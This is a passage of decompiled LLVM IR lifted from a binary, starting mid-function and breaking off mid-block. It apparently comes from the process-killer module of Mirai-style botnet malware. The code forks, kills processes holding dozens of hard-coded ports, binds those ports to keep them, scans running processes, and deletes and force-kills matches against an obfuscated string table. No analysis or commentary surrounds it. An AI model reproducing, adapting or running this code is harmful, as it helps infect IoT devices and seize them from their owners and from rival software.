  uselistorder i32 %v1_cac8, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca58, { 1, 2, 0 }
  uselistorder i32 %v0_ca00, { 1, 0 }
  uselistorder i32 %v2_c9fc, { 1, 0, 2 }
  uselistorder i8* %v3_c9e4, { 1, 0, 2 }
  uselistorder i32 %v2_c9c4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_cd4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
  uselistorder label %dec_label_pc_cc50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc40.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb08, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca6c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca84, { 1, 0 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8448 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-4328 = alloca i32, align 4
  %v3_cf10 = load i32, i32* @r4, align 4
  %v6_cf10 = load i32, i32* @r5, align 4
  %v9_cf10 = load i32, i32* @r6, align 4
  %v12_cf10 = load i32, i32* @r7, align 4
  %v15_cf10 = load i32, i32* @r8, align 4
  %v18_cf10 = load i32, i32* @sb, align 4
  %v21_cf10 = load i32, i32* @sl, align 4
  %v24_cf10 = load i32, i32* @fp, align 4
  %v27_cf10 = load i32, i32* @lr, align 4
  %v2_cf20 = call i32 @__GI_time(i32* null)
  store i32 %v2_cf20, i32* @r7, align 4
  %v0_cf28 = call i32 @__libc_fork()
  %v7_cf2c = icmp eq i32 %v0_cf28, -1
  %. = zext i1 %v7_cf2c to i32
  %tmp133 = icmp slt i32 %v0_cf28, 1
  %storemerge96 = select i1 %tmp133, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_25d50.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf48 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cf28, i32* @global_var_25d50.71, align 4
  br i1 %v2_cf48, label %dec_label_pc_cf64, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf64, %entry
  %v1_cf60 = phi i32 [ %v2_d01c, %dec_label_pc_cf64 ], [ %v0_cf28, %entry ], [ 0, %dec_label_pc_d080 ]
  store i32 %v3_cf10, i32* @r4, align 4
  store i32 %v6_cf10, i32* @r5, align 4
  store i32 %v9_cf10, i32* @r6, align 4
  store i32 %v12_cf10, i32* @r7, align 4
  store i32 %v15_cf10, i32* @r8, align 4
  store i32 %v18_cf10, i32* @sb, align 4
  store i32 %v21_cf10, i32* @sl, align 4
  store i32 %v24_cf10, i32* @fp, align 4
  store i32 %v27_cf10, i32* @lr, align 4
  ret i32 %v1_cf60

dec_label_pc_cf64:                                ; preds = %entry
  %v1_cf68 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_cf70 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_23230.73 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_cf70, i32* %r2.global-to-local, align 4
  %v0_cf80 = load i32, i32* @r5, align 4
  %v1_cf80 = trunc i32 %v0_cf80 to i8
  %v3_cf80 = inttoptr i32 %v0_cf70 to i8*
  store i8 %v1_cf80, i8* %v3_cf80, align 1
  %v0_cf88 = load i32, i32* @r5, align 4
  %v1_cf88 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf88 = inttoptr i32 %v1_cf88 to i32*
  store i32 %v0_cf88, i32* %v2_cf88, align 4
  %v0_cf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf8c = inttoptr i32 %v1_cf8c to i32*
  store i32 %v0_cf8c, i32* %v2_cf8c, align 4
  %v1_cf90 = call i32 @table_unlock_val(i32 13)
  %v1_cf98 = call i32 @table_unlock_val(i32 14)
  %v2_cfa0 = ptrtoint i32* %stack_var_-4328 to i32
  store i32 %v2_cfa0, i32* %r2.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @r5, align 4
  store i32 %v0_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfa4 to i32*
  %v3_cfb0 = call i32 @table_retrieve_val(i32 13, i32* %v2_cfb0)
  %v1_cfb8 = add i32 %v2_cfa0, -24
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb0, i32* %r1.global-to-local, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v2_cfc8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfc8 = call i32 @util_strcpy(i8* %v2_cfc8, i32 %v3_cfb0)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  %v2_cfd0 = add i32 %v3_cfc8, %v1_cfb8
  store i32 %v2_cfd0, i32* @r4, align 4
  %v1_cfd4 = call i32 @__getpid(i32 %v3_cfc8)
  %v2_cfdc = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_cfdc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfe4 = trunc i32 %v1_cfd4 to i8
  %v4_cfe4 = call i32 @util_itoa(i8 %v3_cfe4, i32 10, i32 %v2_cfdc)
  store i32 %v4_cfe4, i32* %r1.global-to-local, align 4
  %v0_cfec = load i32, i32* @r4, align 4
  store i32 %v0_cfec, i32* @r0, align 4
  %v2_cff0 = inttoptr i32 %v0_cfec to i8*
  %v3_cff0 = call i32 @util_strcpy(i8* %v2_cff0, i32 %v4_cfe4)
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  %v1_cff8 = load i32, i32* @r4, align 4
  %v2_cff8 = add i32 %v1_cff8, %v3_cff0
  store i32 %v2_cff8, i32* @r4, align 4
  %v2_d000 = inttoptr i32 %v0_cff4 to i32*
  %v3_d000 = call i32 @table_retrieve_val(i32 14, i32* %v2_d000)
  store i32 %v3_d000, i32* %r1.global-to-local, align 4
  %v0_d008 = load i32, i32* @r4, align 4
  store i32 %v0_d008, i32* @r0, align 4
  %v2_d00c = inttoptr i32 %v0_d008 to i8*
  %v3_d00c = call i32 @util_strcpy(i8* %v2_d00c, i32 %v3_d000)
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 %v3_d00c, i32* @r6, align 4
  %v2_d01c = call i32 @__libc_open(i32 %v1_cfb8, i32 %v0_d010)
  %v7_d020 = icmp eq i32 %v2_d01c, -1
  br i1 %v7_d020, label %dec_label_pc_cf54, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cf64
  %v1_d028 = call i32 @__GI___libc_close(i32 %v2_d01c)
  %v1_d030 = call i32 @table_lock_val(i32 13)
  %v1_d038 = call i32 @table_lock_val(i32 14)
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r3.global-to-local, align 4
  %v2_d044 = load i32, i32* @global_var_25d4c.75, align 4
  store i32 %v2_d044, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d050 = call i32 @readlink(i32 %v1_cfb8, i32 %v2_d044, i32 4095)
  %v7_d054 = icmp eq i32 %v3_d050, -1
  br i1 %v7_d054, label %.thread9, label %bb136

bb136:                                            ; preds = %dec_label_pc_d028
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r1.global-to-local, align 4
  %v3_d05c = load i32, i32* @global_var_25d4c.75, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r5, align 4
  %v2_d060 = trunc i32 %v1_d060 to i8
  %v5_d060 = add i32 %v3_d05c, %v3_d050
  %v6_d060 = inttoptr i32 %v5_d060 to i8*
  store i8 %v2_d060, i8* %v6_d060, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d028, %bb136
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @r6, align 4
  %v1_d068 = load i32, i32* @r4, align 4
  %v1_cfb8.neg = sub i32 24, %v2_cfa0
  %v2_d068 = add i32 %v1_cfb8.neg, %v0_d068
  %v2_d06c = add i32 %v2_d068, %v1_d068
  store i32 %v2_d06c, i32* @r1, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v0_d074 = call i32 @util_zero()
  %v0_d078 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d204 = ptrtoint i32* %stack_var_-272 to i32
  %v2_d3f4 = ptrtoint i32* %stack_var_-192 to i32
  %v2_d400 = bitcast i32* %stack_var_-192 to i8*
  %v2_d444 = ptrtoint i32* %stack_var_-256 to i32
  %v2_d448 = bitcast i32* %stack_var_-256 to i8*
  %v2_d594 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d5a0 = ptrtoint i32* %stack_var_-80 to i32
  %v2_d5a8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d5bc = ptrtoint i32* %stack_var_-8448 to i32
  %v2_d304 = ptrtoint i32* %stack_var_-112 to i32
  %v2_d2cc = ptrtoint i32* %stack_var_-96 to i32
  %v2_d260 = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d3bc, %.thread9
  %stack_var_-8452.0 = phi i32 [ %v0_d078, %.thread9 ], [ %stack_var_-8452.3, %dec_label_pc_d3bc ]
  %v1_d084 = call i32 @table_unlock_val(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d090 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_d094 = call i32 @__GI_opendir(i32 %v3_d090)
  store i32 %v1_d094, i32* @fp, align 4
  %v2_d098 = icmp eq i32 %v1_d094, 0
  br i1 %v2_d098, label %dec_label_pc_cf54, label %dec_label_pc_d0a0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d080
  %v1_d0a4 = call i32 @table_lock_val(i32 13)
  %v1_d0b0 = call i32 @killer_kill_by_port(i32 58811)
  %v1_d0bc = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c700.76 to i32), i32 7))
  %v1_d0c8 = call i32 @killer_kill_by_port(i32 14853)
  %v1_d0d4 = call i32 @killer_kill_by_port(i32 14597)
  %v1_d0e0 = call i32 @killer_kill_by_port(i32 41985)
  %v1_d0e8 = call i32 @killer_kill_by_port(i32 59392)
  %v1_d0f4 = call i32 @killer_kill_by_port(i32 ptrtoint (i32* @global_var_9a02.77 to i32))
  %v1_d100 = call i32 @killer_kill_by_port(i32 35846)
  %v1_d10c = call i32 @killer_kill_by_port(i32 ptrtoint (i32* @global_var_bb01.79 to i32))
  %v1_d118 = call i32 @killer_kill_by_port(i32 57616)
  %v1_d124 = call i32 @killer_kill_by_port(i32 2842)
  %v1_d130 = call i32 @killer_kill_by_port(i32 10522)
  %v1_d13c = call i32 @killer_kill_by_port(i32 59139)
  %v1_d144 = call i32 @killer_kill_by_port(i32 17664)
  %v1_d14c = call i32 @killer_kill_by_port(i32 5376)
  %v1_d154 = call i32 @killer_kill_by_port(i32 5120)
  %v1_d160 = call i32 @killer_kill_by_port(i32 48132)
  %v1_d16c = call i32 @killer_kill_by_port(i32 11010)
  %v1_d178 = call i32 @killer_kill_by_port(i32 48129)
  %v1_d184 = call i32 @killer_kill_by_port(i32 19713)
  %v1_d18c = call i32 @killer_kill_by_port(i32 56832)
  %v1_d194 = call i32 @killer_kill_by_port(i32 28416)
  %v1_d1a0 = call i32 @killer_kill_by_port(i32 ptrtoint (i32* @global_var_9a02.77 to i32))
  %v1_d1ac = call i32 @killer_kill_by_port(i32 2307)
  %v1_d1b8 = call i32 @killer_kill_by_port(i32 30723)
  %v1_d1c4 = call i32 @killer_kill_by_port(i32 59139)
  %v1_d1cc = call i32 @killer_kill_by_port(i32 4)
  %v1_d1d4 = call i32 @killer_kill_by_port(i32 8)
  %v1_d1e0 = call i32 @killer_kill_by_port(i32 20486)
  %v1_d1ec = call i32 @killer_kill_by_port(i32 63248)
  %v1_d1f4 = call i32 @killer_kill_by_port(i32 2816)
  %v1_d1fc = call i32 @killer_kill_by_port(i32 2560)
  store i32 %v2_d204, i32* %r1.global-to-local, align 4
  store i32 -23088, i32* %r3.global-to-local, align 4
  store i32 24465, i32* @r4, align 4
  store i32 5888, i32* %r2.global-to-local, align 4
  %v1_d234 = call i32 @killer_kill_by_port(i32 5888)
  %v2_d238 = icmp eq i32 %v1_d234, 0
  br i1 %v2_d238, label %dec_label_pc_d6c4, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d6e8, %dec_label_pc_d6d8, %dec_label_pc_d6c4, %dec_label_pc_d0a0, %dec_label_pc_d6fc
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d24c = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d250 = icmp eq i32 %v3_d24c, -1
  store i32 %v3_d24c, i32* %r4.global-to-local, align 4
  br i1 %v7_d250, label %dec_label_pc_d278, label %dec_label_pc_d25c

dec_label_pc_d25c:                                ; preds = %dec_label_pc_d240
  store i32 %v2_d260, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d268 = call i32 @bind(i32 %v3_d24c, i32 %v2_d260, i32 16)
  %v0_d26c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d274 = call i32 @listen(i32 %v0_d26c, i32 1)
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d240, %dec_label_pc_d25c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d284 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d288 = icmp eq i32 %v3_d284, -1
  store i32 %v3_d284, i32* %r4.global-to-local, align 4
  br i1 %v7_d288, label %dec_label_pc_d2ac, label %dec_label_pc_d294

dec_label_pc_d294:                                ; preds = %dec_label_pc_d278
  store i32 %v2_d5a0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d29c = call i32 @bind(i32 %v3_d284, i32 %v2_d5a0, i32 16)
  %v0_d2a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d2a8 = call i32 @listen(i32 %v0_d2a0, i32 1)
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d294
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d2b8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d2bc = icmp eq i32 %v3_d2b8, -1
  store i32 %v3_d2b8, i32* %r4.global-to-local, align 4
  br i1 %v7_d2bc, label %dec_label_pc_d2e4, label %dec_label_pc_d2c8

dec_label_pc_d2c8:                                ; preds = %dec_label_pc_d2ac
  store i32 %v2_d2cc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d2d4 = call i32 @bind(i32 %v3_d2b8, i32 %v2_d2cc, i32 16)
  %v0_d2d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d2e0 = call i32 @listen(i32 %v0_d2d8, i32 1)
  br label %dec_label_pc_d2e4

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2ac, %dec_label_pc_d2c8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d2f0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d2f4 = icmp eq i32 %v3_d2f0, -1
  store i32 %v3_d2f0, i32* @r4, align 4
  br i1 %v7_d2f4, label %dec_label_pc_d31c.preheader, label %dec_label_pc_d300

dec_label_pc_d300:                                ; preds = %dec_label_pc_d2e4
  store i32 %v2_d304, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d30c = call i32 @bind(i32 %v3_d2f0, i32 %v2_d304, i32 16)
  %v0_d310 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d318 = call i32 @listen(i32 %v0_d310, i32 1)
  br label %dec_label_pc_d31c.preheader

dec_label_pc_d31c.preheader:                      ; preds = %dec_label_pc_d300, %dec_label_pc_d2e4
  %v0_d31c60 = load i32, i32* @fp, align 4
  %v1_d32061 = inttoptr i32 %v0_d31c60 to i32*
  %v2_d32062 = call i32 @__GI_readdir(i32* %v1_d32061)
  %v2_d32464 = icmp eq i32 %v2_d32062, 0
  br i1 %v2_d32464, label %dec_label_pc_d3bc, label %dec_label_pc_d32c.preheader

dec_label_pc_d32c.preheader:                      ; preds = %dec_label_pc_d31c.preheader, %dec_label_pc_d31c.backedge
  %v0_d32c72 = phi i32 [ %v2_d320, %dec_label_pc_d31c.backedge ], [ %v2_d32062, %dec_label_pc_d31c.preheader ]
  %stack_var_-8452.165 = phi i32 [ %stack_var_-8452.1.be, %dec_label_pc_d31c.backedge ], [ %stack_var_-8452.0, %dec_label_pc_d31c.preheader ]
  br label %dec_label_pc_d32c

dec_label_pc_d32c:                                ; preds = %dec_label_pc_d32c.preheader, %dec_label_pc_d3a4
  %v0_d33c = phi i32 [ %v2_d3b0, %dec_label_pc_d3a4 ], [ %v0_d32c72, %dec_label_pc_d32c.preheader ]
  %stack_var_-8452.2 = phi i32 [ %v1_d350, %dec_label_pc_d3a4 ], [ %stack_var_-8452.165, %dec_label_pc_d32c.preheader ]
  %v1_d32c = add i32 %v0_d33c, 11
  %v2_d32c = inttoptr i32 %v1_d32c to i8*
  %v3_d32c = load i8, i8* %v2_d32c, align 1
  %v4_d32c = zext i8 %v3_d32c to i32
  %v1_d330 = add nsw i32 %v4_d32c, -48
  store i32 %v1_d330, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d330, 9
  br i1 %tmp, label %dec_label_pc_d31c.backedge, label %dec_label_pc_d33c

dec_label_pc_d33c:                                ; preds = %dec_label_pc_d32c
  store i32 %v1_d32c, i32* @r6, align 4
  store i32 %v1_d32c, i32* @r0, align 4
  %v1_d344 = call i32 @atol(i32 %v1_d32c)
  %v0_d34c = load i32, i32* @r5, align 4
  %v1_d350 = add i32 %stack_var_-8452.2, 1
  store i32 %v1_d350, i32* %r3.global-to-local, align 4
  store i32 %v1_d344, i32* @r8, align 4
  %v5_d35c = icmp slt i32 %v0_d34c, %v1_d344
  %v2_d3cc = call i32 @__GI_time(i32* null)
  br i1 %v5_d35c, label %dec_label_pc_d3c8, label %dec_label_pc_d360

dec_label_pc_d360:                                ; preds = %dec_label_pc_d33c
  %v0_d368 = load i32, i32* @r7, align 4
  %v2_d368 = sub i32 %v2_d3cc, %v0_d368
  %v7_d370 = icmp slt i32 %v2_d368, 601
  br i1 %v7_d370, label %dec_label_pc_d378, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d360
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d31c.backedge

dec_label_pc_d378:                                ; preds = %dec_label_pc_d360
  %v0_d378 = load i32, i32* @r8, align 4
  %v7_d37c = icmp slt i32 %v0_d378, 401
  br i1 %v7_d37c, label %dec_label_pc_d31c.backedge, label %dec_label_pc_d380

dec_label_pc_d380:                                ; preds = %dec_label_pc_d378
  %v3_d388 = zext i32 %v1_d350 to i64
  %v4_d388 = mul nuw i64 %v3_d388, 3435973837
  %v7_d388 = trunc i64 %v4_d388 to i32
  store i32 %v7_d388, i32* %r1.global-to-local, align 4
  %v3_d38c1 = udiv i64 %v4_d388, 34359738368
  %v3_d3903 = mul nuw nsw i64 %v3_d38c1, 8
  %v3_d390 = trunc i64 %v3_d3903 to i32
  store i32 %v3_d390, i32* %r3.global-to-local, align 4
  %v2_d3945 = mul nuw nsw i64 %v3_d38c1, 2
  %v2_d394 = trunc i64 %v2_d3945 to i32
  %v2_d398 = add i32 %v3_d390, %v2_d394
  store i32 %v2_d398, i32* %r2.global-to-local, align 4
  %v9_d39c = icmp eq i32 %v1_d350, %v2_d398
  br i1 %v9_d39c, label %dec_label_pc_d3a4, label %dec_label_pc_d31c.backedge

dec_label_pc_d3a4:                                ; preds = %dec_label_pc_d380
  %v1_d3a8 = call i32 @sleep(i32 1)
  %v0_d3ac = load i32, i32* @fp, align 4
  %v1_d3b0 = inttoptr i32 %v0_d3ac to i32*
  %v2_d3b0 = call i32 @__GI_readdir(i32* %v1_d3b0)
  %v2_d3b4 = icmp eq i32 %v2_d3b0, 0
  br i1 %v2_d3b4, label %dec_label_pc_d3bc, label %dec_label_pc_d32c

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d31c.backedge, %dec_label_pc_d3a4, %dec_label_pc_d31c.preheader
  %stack_var_-8452.3 = phi i32 [ %stack_var_-8452.0, %dec_label_pc_d31c.preheader ], [ %v1_d350, %dec_label_pc_d3a4 ], [ %stack_var_-8452.1.be, %dec_label_pc_d31c.backedge ]
  %v0_d3bc = load i32, i32* @fp, align 4
  %v1_d3c0 = inttoptr i32 %v0_d3bc to i32*
  %v2_d3c0 = call i32 @__GI_closedir(i32* %v1_d3c0)
  br label %dec_label_pc_d080

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d33c
  %v1_d3d8 = call i32 @table_unlock_val(i32 13)
  %v1_d3e0 = call i32 @table_unlock_val(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3ec = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_d3f4, i32* @sb, align 4
  store i32 %v3_d3ec, i32* %r1.global-to-local, align 4
  store i32 %v2_d3f4, i32* @r0, align 4
  %v3_d400 = call i32 @util_strcpy(i8* %v2_d400, i32 %v3_d3ec)
  %v1_d404 = load i32, i32* @sb, align 4
  %v2_d404 = add i32 %v1_d404, %v3_d400
  store i32 %v2_d404, i32* %r5.global-to-local, align 4
  %v0_d408 = load i32, i32* @r6, align 4
  store i32 %v0_d408, i32* %r1.global-to-local, align 4
  store i32 %v2_d404, i32* @r0, align 4
  %v2_d410 = inttoptr i32 %v2_d404 to i8*
  %v3_d410 = call i32 @util_strcpy(i8* %v2_d410, i32 %v0_d408)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d410, i32* %r4.global-to-local, align 4
  %v3_d420 = call i32 @table_retrieve_val(i32 14, i32* null)
  store i32 %v3_d420, i32* %r1.global-to-local, align 4
  %v1_d428 = load i32, i32* %r5.global-to-local, align 4
  %v2_d428 = add i32 %v1_d428, %v3_d410
  store i32 %v2_d428, i32* @r0, align 4
  %v2_d42c = inttoptr i32 %v2_d428 to i8*
  %v3_d42c = call i32 @util_strcpy(i8* %v2_d42c, i32 %v3_d420)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d438 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v3_d438, i32* %r1.global-to-local, align 4
  store i32 %v2_d444, i32* @r0, align 4
  %v3_d448 = call i32 @util_strcpy(i8* %v2_d448, i32 %v3_d438)
  store i32 %v2_d444, i32* %r2.global-to-local, align 4
  %v2_d454 = add i32 %v3_d448, %v2_d444
  store i32 %v2_d454, i32* @r5, align 4
  %v0_d458 = load i32, i32* @r6, align 4
  store i32 %v0_d458, i32* %r1.global-to-local, align 4
  store i32 %v2_d454, i32* @r0, align 4
  %v2_d460 = inttoptr i32 %v2_d454 to i8*
  %v3_d460 = call i32 @util_strcpy(i8* %v2_d460, i32 %v0_d458)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d460, i32* @r4, align 4
  %v3_d470 = call i32 @table_retrieve_val(i32 29, i32* null)
  store i32 %v3_d470, i32* %r1.global-to-local, align 4
  %v0_d478 = load i32, i32* @r4, align 4
  %v1_d478 = load i32, i32* @r5, align 4
  %v2_d478 = add i32 %v1_d478, %v0_d478
  store i32 %v2_d478, i32* @r0, align 4
  %v2_d47c = inttoptr i32 %v2_d478 to i8*
  %v3_d47c = call i32 @util_strcpy(i8* %v2_d47c, i32 %v3_d470)
  %v1_d484 = call i32 @table_lock_val(i32 13)
  %v1_d48c = call i32 @table_lock_val(i32 14)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d4a0 = call i32 @readlink(i32 %v2_d3f4, i32 %v1_cfb8, i32 4095)
  %v7_d4a4 = icmp eq i32 %v3_d4a0, -1
  store i32 %v3_d4a0, i32* @r5, align 4
  br i1 %v7_d4a4, label %dec_label_pc_d568, label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d3c8
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d4b8 = add i32 %v3_d4a0, %v1_cfb8
  %v5_d4b8 = inttoptr i32 %v4_d4b8 to i8*
  store i8 0, i8* %v5_d4b8, align 1
  %v1_d4c0 = call i32 @table_unlock_val(i32 30)
  %v0_d4c4 = load i32, i32* @r4, align 4
  store i32 %v0_d4c4, i32* %r1.global-to-local, align 4
  %v2_d4cc = inttoptr i32 %v0_d4c4 to i32*
  %v3_d4cc = call i32 @table_retrieve_val(i32 30, i32* %v2_d4cc)
  %v0_d4d0 = load i32, i32* @r5, align 4
  %v1_d4d0 = add i32 %v0_d4d0, -1
  store i32 %v1_d4d0, i32* @r1, align 4
  store i32 %v3_d4cc, i32* %r2.global-to-local, align 4
  %v4_d4dc = call i32 @util_stristr(i8* %v2_cfc8, i32 %v1_d4d0, i32 %v3_d4cc)
  %v7_d4e0 = icmp eq i32 %v4_d4dc, -1
  br i1 %v7_d4e0, label %dec_label_pc_d4fc, label %dec_label_pc_d4e8

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4b0
  %v1_d4ec = call i32 @unlink(i32 %v1_cfb8)
  %v0_d4f0 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d4f8 = call i32 @kill(i32 %v0_d4f0, i32 9)
  br label %dec_label_pc_d4fc

dec_label_pc_d4fc:                                ; preds = %dec_label_pc_d4b0, %dec_label_pc_d4e8
  %v1_d500 = call i32 @table_lock_val(i32 30)
  %v1_d504 = call i32 @__getpid(i32 %v1_d500)
  store i32 %v1_d504, i32* @r0, align 4
  %v1_d508 = load i32, i32* @r8, align 4
  %v9_d508 = icmp eq i32 %v1_d504, %v1_d508
  br i1 %v9_d508, label %dec_label_pc_d534, label %dec_label_pc_d510

dec_label_pc_d510:                                ; preds = %dec_label_pc_d4fc
  %v0_d510 = call i32 @getppid()
  %v1_d514 = load i32, i32* @r8, align 4
  %v9_d514 = icmp eq i32 %v0_d510, %v1_d514
  br i1 %v9_d514, label %dec_label_pc_d534, label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d510
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r2.global-to-local, align 4
  %v2_d524 = load i32, i32* @global_var_25d4c.75, align 4
  store i32 %v2_d524, i32* %r1.global-to-local, align 4
  %v4_d528 = call i32 @util_strcmp(i8* %v2_cfc8, i32 %v2_d524, i32 ptrtoint (i32* @global_var_25d4c.75 to i32))
  %v2_d52c = icmp eq i32 %v4_d528, 0
  br i1 %v2_d52c, label %dec_label_pc_d540, label %dec_label_pc_d51c.dec_label_pc_d534_crit_edge

dec_label_pc_d51c.dec_label_pc_d534_crit_edge:    ; preds = %dec_label_pc_d51c
  %v0_d538.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d534

dec_label_pc_d534:                                ; preds = %dec_label_pc_d51c.dec_label_pc_d534_crit_edge, %dec_label_pc_d510, %dec_label_pc_d4fc
